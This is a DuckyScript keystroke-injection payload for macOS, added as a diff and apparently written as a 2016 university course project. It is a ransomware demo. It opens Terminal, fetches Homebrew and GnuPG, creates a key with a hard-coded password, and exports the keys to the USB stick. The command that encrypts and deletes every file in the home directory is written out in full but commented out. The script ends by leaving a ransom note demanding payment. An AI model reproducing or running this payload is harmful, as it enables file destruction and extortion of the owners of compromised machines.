@@ -1,0 +1,192 @@
+REM Title: ITP 325 Rubber Ducky Project
+REM Author: Elizabeth Chu
+REM Date: Fall 2016
+REM Description: This script downloads gpg, and encrypts
+REM   the user's home directory with password OMGWTFBBQChicken.
+REM   Note this script is designed for Mac OS Sierra.
+
+REM =================================
+REM Step 1. Download and install GPG
+REM =================================
+DELAY 500
+REM === Command space usually brings up Spotlight Search
+COMMAND SPACE
+DELAY 800
+DELETE
+DELAY 50
+STRING terminal
+DELAY 500
+ENTER
+DELAY 500
+REM === Download local copy of Homebrew
+STRING cd $HOME
+ENTER
+DELAY 50
+STRING mkdir homebrew && curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
+ENTER
+DELAY 10000
+REM === Download GPG using Homebrew
+STRING cd homebrew/bin
+ENTER
+DELAY 50
+STRING ./brew install gnupg
+ENTER
+DELAY 10000
+REM === Need ESC, because Mac Sierra would produce a pop-up window
+ESC
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+
+REM =================================
+REM Step 2. Encrypt home directory
+REM =================================
+STRING cd ../Cellar/gnupg/1
+TAB
+STRING bin
+ENTER
+REM === Generate gpg key with password: OMGWTFBBQChicken
+REM === Note: this workflow is designed for gpg 1.4.21.
+STRING ./gpg1 --gen-key
+DELAY 50
+ENTER
+DELAY 50
+ENTER
+DELAY 50
+ENTER
+DELAY 50
+ENTER
+DELAY 50
+STRING y
+ENTER
+DELAY 50
+STRING hacker
+ENTER
+DELAY 50
+ENTER
+DELAY 50
+ENTER
+DELAY 50
+STRING o
+ENTER
+DELAY 50
+STRING OMGWTFBBQChicken
+ENTER
+DELAY 50
+STRING OMGWTFBBQChicken
+ENTER
+DELAY 200
+REM === Encrypt everything in home directory.
+REM === Uses `find` command to list all files under home, then
+REM === feed that through xargs to bash and execute the local
+REM === gpg to encrypt it, then remove the original file.
+REM STRING find $HOME -type f -print0 | xargs -0 bash -c 'for filename; do ./gpg1 -ea -r hacker "$filename"; rm "$filename"; done' bash
+REM ENTER
+DELAY 2000
+
+REM =================================
+REM Step 3. Export key to USB & delete
+REM =================================
+STRING ./gpg1 --export -a hacker > hacker_public_key.asc
+ENTER
+DELAY 1000
+STRING ./gpg1 --export-secret-key -a hacker > hacker_private_key.asc
+ENTER
+DELAY 1000
+STRING mv hacker_public_key.asc /Volumes/NO\ NAME/
+ENTER
+DELAY 1000
+STRING mv hacker_private_key.asc /Volumes/NO\ NAME/
+ENTER
+DELAY 1000
+STRING ./gpg1 --delete-secret-key hacker
+ENTER
+DELAY 50
+STRING y
+ENTER
+DELAY 50
+STRING y
+ENTER
+DELAY 50
+STRING ./gpg1 --delete-key hacker
+ENTER
+DELAY 50
+STRING y
+ENTER
+DELAY 50
+STRING cd $HOME
+ENTER
+DELAY 50
+STRING rm -rf ./homebrew
+ENTER
+DELAY 1000
+
+
+REM =================================
+REM Step 4. Leave ransom message
+REM =================================
+STRING cd $HOME/Desktop
+ENTER
+DELAY 50
+STRING vi YOU_ARE_HACKED_READ_ME.txt
+ENTER
+DELAY 500
+STRING :set paste
+ENTER
+DELAY 50
+STRING i
+DELAY 50
+STRING                      YOU'VE BEEN HACKED
+ENTER
+STRING                      YOU'VE BEEN HACKED
+ENTER
+STRING                      YOU'VE BEEN HACKED
+ENTER
+STRING                              ,-.
+ENTER
+STRING        ___,---.__          /'|`\          __,---,___
+ENTER
+STRING     ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.
+ENTER
+STRING   ,'        |           ~'\     /`~           |        `.
+ENTER
+STRING  /      ___//              `. ,'          ,  , \___      \
+ENTER
+STRING |    ,-'   `-.__   _         |        ,    __,-'   `-.    |
+ENTER
+STRING |   /          /\_  `   .    |    ,      _/\          \   |
+ENTER
+STRING \  |           \ \`-.___ \   |   / ___,-'/ /           |  /
+ENTER
+STRING  \  \           | `._   `\\  |  //'   _,' |           /  /
+ENTER
+STRING   `-.\         /'  _ `---'' , . ``---' _  `\         /,-'
+ENTER
+STRING      ``       /     \    ,='/ \`=.    /     \       ''
+ENTER
+STRING              |__   /|\_,--.,-.--,--._/|\   __|
+ENTER
+STRING              /  `./  \\`\ |  |  | /,//' \,'  \
+ENTER
+STRING             /   /     ||--+--|--+-/-|     \   \
+ENTER
+STRING            |   |     /'\_\_\ | /_/_/`\     |   |
+ENTER
+STRING             \   \__, \_     `~'     _/ .__/   /
+ENTER
+STRING              `-._,-'   `-._______,-'   `-._,-'
+ENTER
+STRING     ALL YOUR FILES ARE ENCRYPTED AND YOU CAN'T OPEN THEM
+ENTER
+STRING      WITHOUT MY KEY. SEND MONEY TO ME AT COOLHACKER.COM
+ENTER
+STRING                     TO RECEIVE THE KEY.
+ENTER
+ESC
+STRING :wq
+ENTER
+DELAY 200
+STRING done!
